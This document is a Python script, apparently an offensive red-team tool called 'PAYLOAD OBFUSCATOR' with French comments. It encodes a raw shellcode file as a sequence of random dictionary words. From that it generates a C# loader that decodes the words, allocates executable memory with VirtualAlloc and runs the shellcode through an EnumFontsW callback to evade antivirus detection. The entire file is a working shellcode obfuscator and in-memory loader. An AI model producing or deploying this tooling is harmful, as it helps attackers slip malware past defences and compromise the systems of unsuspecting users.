#!/usr/bin/env python3

import sys
import requests
import random
import os
import glob

def get_wordlist(wordlist_source):
    # Si c'est une URL, on télécharge
    if wordlist_source.startswith("http://") or wordlist_source.startswith("https://"):
        response = requests.get(wordlist_source)
        words = response.content.splitlines()
        words = [word.decode('utf-8') for word in words]
    # Sinon, on lit le fichier local
    else:
        with open(wordlist_source, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
    return words

def select_wordlist():
    # Chemin vers le dossier des wordlists
    wordlist_dir = "wordlists"
    # Vérifier si le dossier existe
    if not os.path.exists(wordlist_dir):
        print(f"Le dossier {wordlist_dir} n'existe pas.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Récupérer toutes les wordlists dans le dossier
    wordlist_files = glob.glob(os.path.join(wordlist_dir, "*.txt"))
    if not wordlist_files:
        print(f"Aucune wordlist trouvée dans {wordlist_dir}.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Afficher le menu des wordlists
    print("\nWordlists disponibles :")
    for i, wordlist in enumerate(wordlist_files, 1):
        print(f"{i}. {os.path.basename(wordlist)}")
    print(f"{len(wordlist_files) + 1}. Utiliser une URL ou un chemin personnalisé")
    
    # Demander à l'utilisateur de choisir
    while True:
        try:
            choice = int(input("\nEntrez le numéro de votre choix : "))
            if 1 <= choice <= len(wordlist_files):
                return wordlist_files[choice - 1]
            elif choice == len(wordlist_files) + 1:
                custom_source = input("Entrez l'URL ou le chemin vers la wordlist : ")
                return custom_source
            else:
                print(f"Veuillez entrer un numéro entre 1 et {len(wordlist_files) + 1}")
        except ValueError:
            print("Veuillez entrer un numéro valide.")

def main(input_file, wordlist_source=None):
    # Si aucune wordlist n'est fournie, afficher le menu de sélection
    if wordlist_source is None:
        wordlist_source = select_wordlist()

    # headers
    csharp_headers = '''using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
    '''

    # Création du dictionnaire de correspondance
    words = get_wordlist(wordlist_source)
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    dict_items = [f'{{ "{word}", {hex_val} }}' for hex_val, word in word_dict.items()]
    csharp_dict = "var wordDict = new Dictionary<string, byte>\n{\n    " + ",\n    ".join(dict_items) + "\n};"

    # Encodage du payload
    encoded_string = "string data = \""
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            hex_value = f"0x{byte.hex()}"
            if hex_value in word_dict:
                encoded_string += word_dict[hex_value] + ' '
            byte = f_in.read(1)
    encoded_string = encoded_string.rstrip() + "\";"

    # Affichage de la fonction de décodage
    csharp_decoding_function = """
    static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict){
        var words = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        var byteList = new List<byte>();
        foreach (var word in words){
            if (wordDict.ContainsKey(word)){
                byteList.Add(wordDict[word]);
            }else{
                Console.WriteLine("[!] Error while decoding");
            }
        }
        return byteList.ToArray();
    }"""

    # Affichage de la fonction d'exécution
    csharp_executing_function = '''
    private static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, p, shellcode.Length);
        IntPtr dc = GetDCEx(IntPtr.Zero, IntPtr.Zero, 0);
        EnumFontsW(dc, null, p, IntPtr.Zero);
        ReleaseDC(IntPtr.Zero, dc);
        return;
    }
    '''

    csharp_class_1 = '''
public class Program
{
    const uint MEM_COMMIT = 0x00001000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    [DllImport("kernelbase.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("gdi32.dll")]
    static extern int EnumFontsW(IntPtr hdc, [MarshalAs(UnmanagedType.LPWStr)] string lpLogfont, IntPtr lpProc, IntPtr lParam);
    [DllImport("user32.dll")]
    static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hRgnClip, uint flags);
    [DllImport("user32.dll")]
    static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
    public static void Main()
    {
        Run();
    }
    public static void Run()
    {
    '''

    csharp_class_2 = '''
        byte[] decodedBytes = DecodeWordsToBytes(data, wordDict);
        ExecuteShellcode(decodedBytes);
    }
    '''

    csharp_class_3 = '''
}
    '''

    # Combiner toutes les parties dans un fichier C# généré
    cs_code = f"{csharp_headers}\n\n\n{csharp_class_1}\n\n\n{csharp_dict}\n\n\n{encoded_string}\n\n\n{csharp_class_2}\n\n\n{csharp_decoding_function}\n\n\n{csharp_executing_function}\n\n\n{csharp_class_3}"

    # Sauvegarder le code généré dans un fichier
    with open('generated_code.cs', 'w') as f:
        f.write(cs_code)
    print("Code C# généré avec succès dans 'generated_code.cs'")

if __name__ == "__main__":
    print("##########################################")
    print("########### PAYLOAD OBFUSCATOR ###########")
    print("##########################################\n")

    if len(sys.argv) < 2:
        print("Usage: python encode_cs.py <path_to_raw_payload_file> [<path_or_url_to_wordlist>]\n")
        sys.exit(1)

    file_path = sys.argv[1]
    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else None
    main(file_path, wordlist_source)